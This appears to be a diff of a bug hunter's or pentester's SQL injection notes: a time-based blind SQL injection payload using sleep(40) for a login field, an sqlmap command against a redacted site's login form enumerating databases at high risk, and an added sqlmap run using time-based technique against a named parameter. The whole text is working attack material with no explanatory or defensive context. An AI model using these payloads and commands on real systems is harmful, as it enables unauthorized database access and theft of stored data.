@@ -1,3 +1,6 @@
 admin’ and (select * from(select(sleep(40)))SQLI) and ‘abc’ = ‘abc
 
 ./sqlmap.py -u 'https://sub.redacted.com/index.php' --data='username=Admin&password=admin&Submit=Process+Login&user_login=user_login' --risk 3 --batch --dbs
+
+
+sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5
